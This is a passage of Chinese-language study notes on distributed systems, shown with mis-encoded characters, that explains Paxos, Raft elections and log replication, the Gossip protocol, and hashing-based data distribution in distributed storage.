<p>ç”¨äºè¾¾æˆå…±è¯†æ€§é—®é¢˜ï¼Œå³å¯¹å¤šä¸ªèŠ‚ç‚¹äº§ç”Ÿçš„å€¼ï¼Œè¯¥ç®—æ³•èƒ½ä¿è¯åªé€‰å‡ºå”¯ä¸€ä¸€ä¸ªå€¼ã€‚</p>
<p>ä¸»è¦æœ‰ä¸‰ç±»èŠ‚ç‚¹ï¼š</p>
<ul>
<li>æè®®è€…ï¼ˆProposerï¼‰ï¼šæè®®ä¸€ä¸ªå€¼ï¼›</li>
<li>æ¥å—è€…ï¼ˆAcceptorï¼‰ï¼šå¯¹æ¯ä¸ªæè®®è¿›è¡ŒæŠ•ç¥¨ï¼›</li>
<li>å‘ŠçŸ¥è€…ï¼ˆLearnerï¼‰ï¼šè¢«å‘ŠçŸ¥æŠ•ç¥¨çš„ç»“æœï¼Œä¸å‚ä¸æŠ•ç¥¨è¿‡ç¨‹ã€‚</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/b988877c-0f0a-4593-916d-de2081320628.jpg"/> </div><br>
<h3 id="æ‰§è¡Œè¿‡ç¨‹" tabindex="-1"> æ‰§è¡Œè¿‡ç¨‹</h3>
<p>è§„å®šä¸€ä¸ªæè®®åŒ…å«ä¸¤ä¸ªå­—æ®µï¼š[n, v]ï¼Œå…¶ä¸­ n ä¸ºåºå·ï¼ˆå…·æœ‰å”¯ä¸€æ€§ï¼‰ï¼Œv ä¸ºæè®®å€¼ã€‚</p>
<h4 id="_1-prepare-é˜¶æ®µ" tabindex="-1"> 1. Prepare é˜¶æ®µ</h4>
<p>ä¸‹å›¾æ¼”ç¤ºäº†ä¸¤ä¸ª Proposer å’Œä¸‰ä¸ª Acceptor çš„ç³»ç»Ÿä¸­è¿è¡Œè¯¥ç®—æ³•çš„åˆå§‹è¿‡ç¨‹ï¼Œæ¯ä¸ª Proposer éƒ½ä¼šå‘æ‰€æœ‰ Acceptor å‘é€ Prepare è¯·æ±‚ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1a9977e4-2f5c-49a6-aec9-f3027c9f46a7.png"/> </div><br>
<p>å½“ Acceptor æ¥æ”¶åˆ°ä¸€ä¸ª Prepare è¯·æ±‚ï¼ŒåŒ…å«çš„æè®®ä¸º [n1, v1]ï¼Œå¹¶ä¸”ä¹‹å‰è¿˜æœªæ¥æ”¶è¿‡ Prepare è¯·æ±‚ï¼Œé‚£ä¹ˆå‘é€ä¸€ä¸ª Prepare å“åº”ï¼Œè®¾ç½®å½“å‰æ¥æ”¶åˆ°çš„æè®®ä¸º [n1, v1]ï¼Œå¹¶ä¸”ä¿è¯ä»¥åä¸ä¼šå†æ¥å—åºå·å°äº n1 çš„æè®®ã€‚</p>
<p>å¦‚ä¸‹å›¾ï¼ŒAcceptor X åœ¨æ”¶åˆ° [n=2, v=8] çš„ Prepare è¯·æ±‚æ—¶ï¼Œç”±äºä¹‹å‰æ²¡æœ‰æ¥æ”¶è¿‡æè®®ï¼Œå› æ­¤å°±å‘é€ä¸€ä¸ª [no previous] çš„ Prepare å“åº”ï¼Œè®¾ç½®å½“å‰æ¥æ”¶åˆ°çš„æè®®ä¸º [n=2, v=8]ï¼Œå¹¶ä¸”ä¿è¯ä»¥åä¸ä¼šå†æ¥å—åºå·å°äº 2 çš„æè®®ã€‚å…¶å®ƒçš„ Acceptor ç±»ä¼¼ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/fb44307f-8e98-4ff7-a918-31dacfa564b4.jpg"/> </div><br>
<p>å¦‚æœ Acceptor æ¥æ”¶åˆ°ä¸€ä¸ª Prepare è¯·æ±‚ï¼ŒåŒ…å«çš„æè®®ä¸º [n2, v2]ï¼Œå¹¶ä¸”ä¹‹å‰å·²ç»æ¥æ”¶è¿‡æè®® [n1, v1]ã€‚å¦‚æœ n1 &gt; n2ï¼Œé‚£ä¹ˆå°±ä¸¢å¼ƒè¯¥æè®®è¯·æ±‚ï¼›å¦åˆ™ï¼Œå‘é€ Prepare å“åº”ï¼Œè¯¥ Prepare å“åº”åŒ…å«ä¹‹å‰å·²ç»æ¥æ”¶è¿‡çš„æè®® [n1, v1]ï¼Œè®¾ç½®å½“å‰æ¥æ”¶åˆ°çš„æè®®ä¸º [n2, v2]ï¼Œå¹¶ä¸”ä¿è¯ä»¥åä¸ä¼šå†æ¥å—åºå·å°äº n2 çš„æè®®ã€‚</p>
<p>å¦‚ä¸‹å›¾ï¼ŒAcceptor Z æ”¶åˆ° Proposer A å‘æ¥çš„ [n=2, v=8] çš„ Prepare è¯·æ±‚ï¼Œç”±äºä¹‹å‰å·²ç»æ¥æ”¶è¿‡ [n=4, v=5] çš„æè®®ï¼Œå¹¶ä¸” n &gt; 2ï¼Œå› æ­¤å°±æŠ›å¼ƒè¯¥æè®®è¯·æ±‚ï¼›Acceptor X æ”¶åˆ° Proposer B å‘æ¥çš„ [n=4, v=5] çš„ Prepare è¯·æ±‚ï¼Œå› ä¸ºä¹‹å‰æ¥æ”¶åˆ°çš„æè®®ä¸º [n=2, v=8]ï¼Œå¹¶ä¸” 2 &lt;= 4ï¼Œå› æ­¤å°±å‘é€ [n=2, v=8] çš„ Prepare å“åº”ï¼Œè®¾ç½®å½“å‰æ¥æ”¶åˆ°çš„æè®®ä¸º [n=4, v=5]ï¼Œå¹¶ä¸”ä¿è¯ä»¥åä¸ä¼šå†æ¥å—åºå·å°äº 4 çš„æè®®ã€‚Acceptor Y ç±»ä¼¼ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/2bcc58ad-bf7f-485c-89b5-e7cafc211ce2.jpg"/> </div><br>
<h4 id="_2-accept-é˜¶æ®µ" tabindex="-1"> 2. Accept é˜¶æ®µ</h4>
<p>å½“ä¸€ä¸ª Proposer æ¥æ”¶åˆ°è¶…è¿‡ä¸€åŠ Acceptor çš„ Prepare å“åº”æ—¶ï¼Œå°±å¯ä»¥å‘é€ Accept è¯·æ±‚ã€‚</p>
<p>Proposer A æ¥æ”¶åˆ°ä¸¤ä¸ª Prepare å“åº”ä¹‹åï¼Œå°±å‘é€ [n=2, v=8] Accept è¯·æ±‚ã€‚è¯¥ Accept è¯·æ±‚ä¼šè¢«æ‰€æœ‰ Acceptor ä¸¢å¼ƒï¼Œå› ä¸ºæ­¤æ—¶æ‰€æœ‰ Acceptor éƒ½ä¿è¯ä¸æ¥å—åºå·å°äº 4 çš„æè®®ã€‚</p>
<p>Proposer B è¿‡åä¹Ÿæ”¶åˆ°äº†ä¸¤ä¸ª Prepare å“åº”ï¼Œå› æ­¤ä¹Ÿå¼€å§‹å‘é€ Accept è¯·æ±‚ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒAccept è¯·æ±‚çš„ v éœ€è¦å–å®ƒæ”¶åˆ°çš„æœ€å¤§æè®®ç¼–å·å¯¹åº”çš„ v å€¼ï¼Œä¹Ÿå°±æ˜¯ 8ã€‚å› æ­¤å®ƒå‘é€ [n=4, v=8] çš„ Accept è¯·æ±‚ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/9b838aee-0996-44a5-9b0f-3d1e3e2f5100.png"/> </div><br>
<h4 id="_3-learn-é˜¶æ®µ" tabindex="-1"> 3. Learn é˜¶æ®µ</h4>
<p>Acceptor æ¥æ”¶åˆ° Accept è¯·æ±‚æ—¶ï¼Œå¦‚æœåºå·å¤§äºç­‰äºè¯¥ Acceptor æ‰¿è¯ºçš„æœ€å°åºå·ï¼Œé‚£ä¹ˆå°±å‘é€ Learn æè®®ç»™æ‰€æœ‰çš„ Learnerã€‚å½“ Learner å‘ç°æœ‰å¤§å¤šæ•°çš„ Acceptor æ¥æ”¶äº†æŸä¸ªæè®®ï¼Œé‚£ä¹ˆè¯¥æè®®çš„æè®®å€¼å°±è¢« Paxos é€‰æ‹©å‡ºæ¥ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/bf667594-bb4b-4634-bf9b-0596a45415ba.jpg"/> </div><br>
<h3 id="çº¦æŸæ¡ä»¶" tabindex="-1"> çº¦æŸæ¡ä»¶</h3>
<h4 id="_1-æ­£ç¡®æ€§" tabindex="-1"> 1. æ­£ç¡®æ€§</h4>
<p>æŒ‡åªæœ‰ä¸€ä¸ªæè®®å€¼ä¼šç”Ÿæ•ˆã€‚</p>
<p>å› ä¸º Paxos åè®®è¦æ±‚æ¯ä¸ªç”Ÿæ•ˆçš„æè®®è¢«å¤šæ•° Acceptor æ¥æ”¶ï¼Œå¹¶ä¸” Acceptor ä¸ä¼šæ¥å—ä¸¤ä¸ªä¸åŒçš„æè®®ï¼Œå› æ­¤å¯ä»¥ä¿è¯æ­£ç¡®æ€§ã€‚</p>
<h4 id="_2-å¯ç»ˆæ­¢æ€§" tabindex="-1"> 2. å¯ç»ˆæ­¢æ€§</h4>
<p>æŒ‡æœ€åæ€»ä¼šæœ‰ä¸€ä¸ªæè®®ç”Ÿæ•ˆã€‚</p>
<p>Paxos åè®®èƒ½å¤Ÿè®© Proposer å‘é€çš„æè®®æœç€èƒ½è¢«å¤§å¤šæ•° Acceptor æ¥å—çš„é‚£ä¸ªæè®®é æ‹¢ï¼Œå› æ­¤èƒ½å¤Ÿä¿è¯å¯ç»ˆæ­¢æ€§ã€‚</p>
<h2 id="raft" tabindex="-1"> Raft</h2>
<p>Raft ä¹Ÿæ˜¯åˆ†å¸ƒå¼ä¸€è‡´æ€§åè®®ï¼Œä¸»è¦æ˜¯ç”¨æ¥ç«é€‰ä¸»èŠ‚ç‚¹ã€‚</p>
<h3 id="å•ä¸ª-candidate-çš„ç«é€‰" tabindex="-1"> å•ä¸ª Candidate çš„ç«é€‰</h3>
<p>æœ‰ä¸‰ç§èŠ‚ç‚¹ï¼šFollowerã€Candidate å’Œ Leaderã€‚Leader ä¼šå‘¨æœŸæ€§çš„å‘é€å¿ƒè·³åŒ…ç»™ Followerã€‚æ¯ä¸ª Follower éƒ½è®¾ç½®äº†ä¸€ä¸ªéšæœºçš„ç«é€‰è¶…æ—¶æ—¶é—´ï¼Œä¸€èˆ¬ä¸º 150ms~300msï¼Œå¦‚æœåœ¨è¿™ä¸ªæ—¶é—´å†…æ²¡æœ‰æ”¶åˆ° Leader çš„å¿ƒè·³åŒ…ï¼Œå°±ä¼šå˜æˆ Candidateï¼Œè¿›å…¥ç«é€‰é˜¶æ®µã€‚</p>
<ul>
<li>ä¸‹å›¾å±•ç¤ºä¸€ä¸ªåˆ†å¸ƒå¼ç³»ç»Ÿçš„æœ€åˆé˜¶æ®µï¼Œæ­¤æ—¶åªæœ‰ Follower æ²¡æœ‰ Leaderã€‚Node A ç­‰å¾…ä¸€ä¸ªéšæœºçš„ç«é€‰è¶…æ—¶æ—¶é—´ä¹‹åï¼Œæ²¡æ”¶åˆ° Leader å‘æ¥çš„å¿ƒè·³åŒ…ï¼Œå› æ­¤è¿›å…¥ç«é€‰é˜¶æ®µã€‚</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/111521118015898.gif"/> </div><br>
<ul>
<li>æ­¤æ—¶ Node A å‘é€æŠ•ç¥¨è¯·æ±‚ç»™å…¶å®ƒæ‰€æœ‰èŠ‚ç‚¹ã€‚</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/111521118445538.gif"/> </div><br>
<ul>
<li>å…¶å®ƒèŠ‚ç‚¹ä¼šå¯¹è¯·æ±‚è¿›è¡Œå›å¤ï¼Œå¦‚æœè¶…è¿‡ä¸€åŠçš„èŠ‚ç‚¹å›å¤äº†ï¼Œé‚£ä¹ˆè¯¥ Candidate å°±ä¼šå˜æˆ Leaderã€‚</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/111521118483039.gif"/> </div><br>
<ul>
<li>ä¹‹å Leader ä¼šå‘¨æœŸæ€§åœ°å‘é€å¿ƒè·³åŒ…ç»™ Followerï¼ŒFollower æ¥æ”¶åˆ°å¿ƒè·³åŒ…ï¼Œä¼šé‡æ–°å¼€å§‹è®¡æ—¶ã€‚</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/111521118640738.gif"/> </div><br>
<h3 id="å¤šä¸ª-candidate-ç«é€‰" tabindex="-1"> å¤šä¸ª Candidate ç«é€‰</h3>
<ul>
<li>å¦‚æœæœ‰å¤šä¸ª Follower æˆä¸º Candidateï¼Œå¹¶ä¸”æ‰€è·å¾—ç¥¨æ•°ç›¸åŒï¼Œé‚£ä¹ˆå°±éœ€è¦é‡æ–°å¼€å§‹æŠ•ç¥¨ã€‚ä¾‹å¦‚ä¸‹å›¾ä¸­ Node B å’Œ Node D éƒ½è·å¾—ä¸¤ç¥¨ï¼Œéœ€è¦é‡æ–°å¼€å§‹æŠ•ç¥¨ã€‚</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/111521119203347.gif"/> </div><br>
<ul>
<li>ç”±äºæ¯ä¸ªèŠ‚ç‚¹è®¾ç½®çš„éšæœºç«é€‰è¶…æ—¶æ—¶é—´ä¸åŒï¼Œå› æ­¤ä¸‹ä¸€æ¬¡å†æ¬¡å‡ºç°å¤šä¸ª Candidate å¹¶è·å¾—åŒæ ·ç¥¨æ•°çš„æ¦‚ç‡å¾ˆä½ã€‚</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/111521119368714.gif"/> </div><br>
<h2 id="gossip" tabindex="-1"> Gossip</h2>
<p>Gossipåè®®ä¸»è¦ç”¨åœ¨åˆ†å¸ƒå¼æ•°æ®åº“ç³»ç»Ÿä¸­å„ä¸ªå‰¯æœ¬èŠ‚ç‚¹åŒæ­¥æ•°æ®ä¹‹ç”¨ï¼Œè¿™ç§åœºæ™¯çš„ä¸€ä¸ªæœ€å¤§ç‰¹ç‚¹å°±æ˜¯ç»„æˆçš„ç½‘ç»œçš„èŠ‚ç‚¹éƒ½æ˜¯å¯¹ç­‰èŠ‚ç‚¹ï¼Œæ˜¯éç»“æ„åŒ–ç½‘ç»œï¼Œ</p>
<h3 id="ä¼˜ç‚¹" tabindex="-1"> ä¼˜ç‚¹</h3>
<ul>
<li>æ‰©å±•æ€§ï¼šç½‘ç»œå¯ä»¥å…è®¸èŠ‚ç‚¹çš„ä»»æ„å¢åŠ å’Œå‡å°‘ï¼Œæ–°å¢åŠ çš„èŠ‚ç‚¹çš„çŠ¶æ€æœ€ç»ˆä¼šä¸å…¶ä»–èŠ‚ç‚¹ä¸€è‡´ã€‚</li>
<li>å®¹é”™ï¼šç½‘ç»œä¸­ä»»ä½•èŠ‚ç‚¹çš„å®•æœºå’Œé‡å¯éƒ½ä¸ä¼šå½±å“ Gossip æ¶ˆæ¯çš„ä¼ æ’­ï¼ŒGossip åè®®å…·æœ‰å¤©ç„¶çš„åˆ†å¸ƒå¼ç³»ç»Ÿå®¹é”™ç‰¹æ€§ã€‚</li>
<li>å»ä¸­å¿ƒåŒ–ï¼šGossip åè®®ä¸è¦æ±‚ä»»ä½•ä¸­å¿ƒèŠ‚ç‚¹ï¼Œæ‰€æœ‰èŠ‚ç‚¹éƒ½å¯ä»¥æ˜¯å¯¹ç­‰çš„ï¼Œä»»ä½•ä¸€ä¸ªèŠ‚ç‚¹æ— éœ€çŸ¥é“æ•´ä¸ªç½‘ç»œçŠ¶å†µï¼Œåªè¦ç½‘ç»œæ˜¯è¿é€šçš„ï¼Œä»»æ„ä¸€ä¸ªèŠ‚ç‚¹å°±å¯ä»¥æŠŠæ¶ˆæ¯æ•£æ’­åˆ°å…¨ç½‘ã€‚</li>
<li>ä¸€è‡´æ€§æ”¶æ•›ï¼šGossip åè®®ä¸­çš„æ¶ˆæ¯ä¼šä»¥ä¸€ä¼ åã€åä¼ ç™¾ä¸€æ ·çš„æŒ‡æ•°çº§é€Ÿåº¦åœ¨ç½‘ç»œä¸­å¿«é€Ÿä¼ æ’­ï¼Œå› æ­¤ç³»ç»ŸçŠ¶æ€çš„ä¸ä¸€è‡´å¯ä»¥åœ¨å¾ˆå¿«çš„æ—¶é—´å†…æ”¶æ•›åˆ°ä¸€è‡´ã€‚æ¶ˆæ¯ä¼ æ’­é€Ÿåº¦è¾¾åˆ°äº† logNã€‚</li>
<li>ç®€å•ï¼šGossip åè®®çš„è¿‡ç¨‹æå…¶ç®€å•ï¼Œå®ç°èµ·æ¥å‡ ä¹æ²¡æœ‰å¤ªå¤šå¤æ‚æ€§ã€‚</li>
</ul>
<h3 id="ç¼ºç‚¹" tabindex="-1"> ç¼ºç‚¹</h3>
<ul>
<li>æ¶ˆæ¯çš„å»¶è¿Ÿï¼šç”±äº Gossip åè®®ä¸­ï¼ŒèŠ‚ç‚¹åªä¼šéšæœºå‘å°‘æ•°å‡ ä¸ªèŠ‚ç‚¹å‘é€æ¶ˆæ¯ï¼Œæ¶ˆæ¯æœ€ç»ˆæ˜¯é€šè¿‡å¤šä¸ªè½®æ¬¡çš„æ•£æ’­è€Œåˆ°è¾¾å…¨ç½‘çš„ï¼Œå› æ­¤ä½¿ç”¨ Gossip åè®®ä¼šé€ æˆä¸å¯é¿å…çš„æ¶ˆæ¯å»¶è¿Ÿã€‚ä¸é€‚åˆç”¨åœ¨å¯¹å®æ—¶æ€§è¦æ±‚è¾ƒé«˜çš„åœºæ™¯ä¸‹ã€‚</li>
<li>æ¶ˆæ¯å†—ä½™ï¼šGossip åè®®è§„å®šï¼ŒèŠ‚ç‚¹ä¼šå®šæœŸéšæœºé€‰æ‹©å‘¨å›´èŠ‚ç‚¹å‘é€æ¶ˆæ¯ï¼Œè€Œæ”¶åˆ°æ¶ˆæ¯çš„èŠ‚ç‚¹ä¹Ÿä¼šé‡å¤è¯¥æ­¥éª¤ï¼Œå› æ­¤å°±ä¸å¯é¿å…çš„å­˜åœ¨æ¶ˆæ¯é‡å¤å‘é€ç»™åŒä¸€èŠ‚ç‚¹çš„æƒ…å†µï¼Œé€ æˆäº†æ¶ˆæ¯çš„å†—ä½™ï¼ŒåŒæ—¶ä¹Ÿå¢åŠ äº†æ”¶åˆ°æ¶ˆæ¯çš„èŠ‚ç‚¹çš„å¤„ç†å‹åŠ›ã€‚è€Œä¸”ï¼Œç”±äºæ˜¯å®šæœŸå‘é€è€Œä¸”ä¸åé¦ˆï¼Œå› æ­¤ï¼Œå³ä½¿èŠ‚ç‚¹æ”¶åˆ°äº†æ¶ˆæ¯ï¼Œè¿˜æ˜¯ä¼šåå¤æ”¶åˆ°é‡å¤æ¶ˆæ¯ï¼ŒåŠ é‡äº†æ¶ˆæ¯çš„å†—ä½™ã€‚</li>
</ul>
<h3 id="æ•°æ®åŒæ­¥" tabindex="-1"> æ•°æ®åŒæ­¥</h3>
<ul>
<li>æ¥è‡ªå®¢æˆ·ç«¯çš„ä¿®æ”¹éƒ½ä¼šè¢«ä¼ å…¥ Leaderã€‚æ³¨æ„è¯¥ä¿®æ”¹è¿˜æœªè¢«æäº¤ï¼Œåªæ˜¯å†™å…¥æ—¥å¿—ä¸­ã€‚</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/71550414107576.gif"/> </div><br>
<ul>
<li>Leader ä¼šæŠŠä¿®æ”¹å¤åˆ¶åˆ°æ‰€æœ‰ Followerã€‚</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/91550414131331.gif"/> </div><br>
<ul>
<li>Leader ä¼šç­‰å¾…å¤§å¤šæ•°çš„ Follower ä¹Ÿè¿›è¡Œäº†ä¿®æ”¹ï¼Œç„¶åæ‰å°†ä¿®æ”¹æäº¤ã€‚</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/101550414151983.gif"/> </div><br>
<ul>
<li>æ­¤æ—¶ Leader ä¼šé€šçŸ¥çš„æ‰€æœ‰ Follower è®©å®ƒä»¬ä¹Ÿæäº¤ä¿®æ”¹ï¼Œæ­¤æ—¶æ‰€æœ‰èŠ‚ç‚¹çš„å€¼è¾¾æˆä¸€è‡´ã€‚</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/111550414182638.gif"/> </div><br>
<h1 id="åˆ†å¸ƒå¼å­˜å‚¨" tabindex="-1"> åˆ†å¸ƒå¼å­˜å‚¨</h1>
<p>åˆ†å¸ƒå¼å­˜å‚¨ç³»ç»Ÿå°†æ•°æ®åˆ†æ•£å­˜å‚¨åœ¨å¤šå°ç‹¬ç«‹çš„è®¾å¤‡ä¸Šã€‚ä¼ ç»Ÿçš„ç½‘ç»œå­˜å‚¨ç³»ç»Ÿé‡‡ç”¨é›†ä¸­çš„å­˜å‚¨æœåŠ¡å™¨å­˜æ”¾æ‰€æœ‰æ•°æ®ï¼Œå­˜å‚¨æœåŠ¡å™¨æˆä¸ºç³»ç»Ÿæ€§èƒ½çš„ç“¶é¢ˆï¼Œä¹Ÿæ˜¯å¯é æ€§å’Œå®‰å…¨æ€§çš„ç„¦ç‚¹ï¼Œä¸èƒ½æ»¡è¶³å¤§è§„æ¨¡å­˜å‚¨åº”ç”¨çš„éœ€è¦ã€‚åˆ†å¸ƒå¼ç½‘ç»œå­˜å‚¨ç³»ç»Ÿé‡‡ç”¨å¯æ‰©å±•çš„ç³»ç»Ÿç»“æ„ï¼Œåˆ©ç”¨å¤šå°å­˜å‚¨æœåŠ¡å™¨åˆ†æ‹…å­˜å‚¨è´Ÿè·ï¼Œåˆ©ç”¨ä½ç½®æœåŠ¡å™¨å®šä½å­˜å‚¨ä¿¡æ¯ï¼Œå®ƒä¸ä½†æé«˜äº†ç³»ç»Ÿçš„å¯é æ€§ã€å¯ç”¨æ€§å’Œå­˜å–æ•ˆç‡ï¼Œè¿˜æ˜“äºæ‰©å±•ã€‚</p>
<h2 id="åˆ†å¸ƒå¼å­˜å‚¨ç³»ç»Ÿç‰¹æ€§" tabindex="-1"> åˆ†å¸ƒå¼å­˜å‚¨ç³»ç»Ÿç‰¹æ€§</h2>
<h3 id="å¯æ‰©å±•" tabindex="-1"> å¯æ‰©å±•</h3>
<p>åˆ†å¸ƒå¼å­˜å‚¨ç³»ç»Ÿå¯ä»¥æ‰©å±•åˆ°å‡ ç™¾å°ç”šè‡³å‡ åƒå°çš„é›†ç¾¤è§„æ¨¡ï¼Œè€Œä¸”éšç€é›†ç¾¤è§„æ¨¡çš„å¢é•¿ï¼Œç³»ç»Ÿæ•´ä½“æ€§èƒ½è¡¨ç°ä¸ºçº¿æ€§å¢é•¿ã€‚</p>
<h3 id="ä½æˆæœ¬" tabindex="-1"> ä½æˆæœ¬</h3>
<p>åˆ†å¸ƒå¼å­˜å‚¨ç³»ç»Ÿçš„è‡ªåŠ¨å®¹é”™ã€è‡ªåŠ¨è´Ÿè½½å‡è¡¡æœºåˆ¶ä½¿å…¶å¯ä»¥æ„å»ºåœ¨æ™®é€šçš„PCæœºä¹‹ä¸Šã€‚å¦å¤–ï¼Œçº¿æ€§æ‰©å±•èƒ½åŠ›ä¹Ÿä½¿å¾—å¢åŠ ã€å‡å°‘æœºå™¨éå¸¸æ–¹ä¾¿ï¼Œå¯ä»¥å®ç°è‡ªåŠ¨è¿ç»´ã€‚</p>
<h3 id="é«˜æ€§èƒ½" tabindex="-1"> é«˜æ€§èƒ½</h3>
<p>æ— è®ºæ˜¯é’ˆå¯¹æ•´ä¸ªé›†ç¾¤è¿˜æ˜¯å•å°æœåŠ¡å™¨ï¼Œéƒ½è¦æ±‚åˆ†å¸ƒå¼å­˜å‚¨ç³»ç»Ÿå…·å¤‡é«˜æ€§èƒ½ã€‚</p>
<h3 id="æ˜“ç”¨" tabindex="-1"> æ˜“ç”¨</h3>
<p>åˆ†å¸ƒå¼å­˜å‚¨ç³»ç»Ÿéœ€è¦èƒ½å¤Ÿæä¾›æ˜“ç”¨çš„å¯¹å¤–æ¥å£ï¼Œå¦å¤–ï¼Œä¹Ÿè¦æ±‚å…·å¤‡å®Œå–„çš„ç›‘æ§ã€è¿ç»´å·¥å…·ï¼Œå¹¶èƒ½å¤Ÿæ–‡ç© ä¸å…¶ä»–ç³»ç»Ÿé›†æˆã€‚</p>
<h2 id="æŠ€æœ¯éš¾ç‚¹" tabindex="-1"> æŠ€æœ¯éš¾ç‚¹</h2>
<p>åˆ†å¸ƒå¼å­˜å‚¨ç³»ç»Ÿçš„æŒ‘æˆ˜ä¸»è¦åœ¨äºæ•°æ®ã€çŠ¶æ€ä¿¡æ¯çš„æŒä¹…åŒ–ï¼Œè¦æ±‚åœ¨è‡ªåŠ¨è¿ç§»ã€è‡ªåŠ¨å®¹é”™ã€å¹¶å‘è¯»å†™çš„è¿‡ç¨‹ä¸­ä¿è¯æ•°æ®çš„ä¸€è‡´æ€§ã€‚åˆ†å¸ƒå¼å­˜å‚¨æ¶‰åŠçš„æŠ€æœ¯ä¸»è¦æ¥è‡ªä¸¤ä¸ªé¢†åŸŸï¼šåˆ†å¸ƒå¼ç³»ç»Ÿä»¥åŠæ•°æ®åº“ã€‚</p>
<h3 id="æ•°æ®åˆ†å¸ƒ-è´Ÿè½½å‡è¡¡" tabindex="-1"> æ•°æ®åˆ†å¸ƒ è´Ÿè½½å‡è¡¡</h3>
<h4 id="å“ˆå¸Œç®—æ³•" tabindex="-1"> å“ˆå¸Œç®—æ³•</h4>
<p>æŒ‰ç…§keyçš„hashå€¼å¯¹èŠ‚ç‚¹è¿›è¡Œå–æ¨¡ï¼Œç„¶åå¾—åˆ°çš„ç»“æœå°±æ˜¯å­˜æ”¾æ•°æ®çš„èŠ‚ç‚¹ï¼›</p>
<p>ç¼ºç‚¹ï¼šå¦‚æœä¸€ä¸ªèŠ‚ç‚¹æŒ‚äº†ï¼Œæ–°çš„æ•°æ®æŒ‰ç…§æ–°çš„èŠ‚ç‚¹æ•°æ®å–æ¨¡å¯¼è‡´æ— æ³•å–åˆ°æ•°æ®ï¼ˆæ‰€æœ‰æ•°æ®éƒ½å–ä¸åˆ°ï¼‰ï¼Œäºæ˜¯å°±ä¼šè¢«å‡»ç©¿åˆ°æ•°æ®åº“ï¼Œå¯¼è‡´æ•°æ®åº“å‹åŠ›å¢å¤§ã€‚åŒæ—¶éœ€è¦é‡æ–°è¿›è¡Œå¤§é‡è®¡ç®—ï¼ŒæŠŠåŸæœ‰æ•°æ®è¿›è¡Œé‡æ–°åˆ†é…ã€‚</p>
<h4 id="ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•" tabindex="-1"> ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•</h4>
<p>æŠŠèŠ‚ç‚¹åˆ†å¸ƒåˆ°ä¸€ä¸ªåœ†ç¯ä¸­åˆ†å¸ƒï¼Œkeyçš„hashå€¼äºå½“å‰èŠ‚ç‚¹hashå€¼æ¯”è¾ƒï¼Œç„¶åç¡®å®šåœ¨åœ†ç¯ä¸Šçš„ä½ç½®ï¼ŒåŒæ—¶æŒ‰ç…§é¡ºæ—¶é’ˆæ–¹å‘å»å¯»æ‰¾æœ€è¿‘çš„ä¸€ä¸ªèŠ‚ç‚¹ã€‚</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-17-31-12.png" alt="" loading="lazy"></p>
<p>æŒ‰ç…§ä¸Šè¿°ç†è®ºï¼Œå½“ä¸€ä¸ªèŠ‚ç‚¹å¤±æ•ˆçš„æ—¶å€™ï¼Œå°±åªæœ‰è¿™ä¸ªèŠ‚ç‚¹å¯¹åº”çš„æ•°æ®æ— æ³•å–åˆ°ï¼Œè€Œå…¶ä»–èŠ‚ç‚¹æ•°æ®ä¾ç„¶è¿˜æ˜¯å¯ä»¥å–åˆ°ã€‚æ‰€ä»¥ï¼Œå¯ç”¨æ€§æ¯”hashç®—æ³•è¦é«˜ã€‚</p>
<p>ç¼ºç‚¹ï¼šé’ˆå¯¹çƒ­ç‚¹æ•°æ®é—®é¢˜ï¼Œå¯èƒ½éƒ½ä¼šæ¶Œå…¥åˆ°åŒä¸€ä¸ªèŠ‚ç‚¹ä¸­ï¼Œè€Œå…¶ä»–èŠ‚ç‚¹æ•°æ®åˆå°‘ã€‚</p>
<p>è§£å†³åŠæ³•ï¼š</p>
<p>è™šæ‹ŸèŠ‚ç‚¹ã€å‡åŒ€ä¸€è‡´æ€§hashï¼šåœ¨åœ†ç¯ä¸­å¢åŠ å¤šä¸ªè™šæ‹Ÿçš„åŒç±»èŠ‚ç‚¹ï¼Œæ¯”å¦‚åŸæ¥æœ‰1å· 2 å· 3å· è¿™ä¸‰ä¸ªèŠ‚ç‚¹ï¼Œç°åœ¨è™šæ‹Ÿå‡ºå¤šä¸ª1å·ã€2å¥½ã€3å·çš„èŠ‚ç‚¹åˆ†å¸ƒåœ¨åœ†ç¯ä¸Šï¼Œè¿™æ ·å°±å¯ä»¥æ›´ç»†ç²’åº¦çš„åˆ‡å‰²åœ†ç¯æ•°æ®ï¼Œå°½é‡å‡å°‘äº†çƒ­ç‚¹æ•°æ®é›†ä¸­é—®é¢˜ã€‚</p>
<h4 id="hash-slot-ç®—æ³•" tabindex="-1"> hash slot ç®—æ³•</h4>
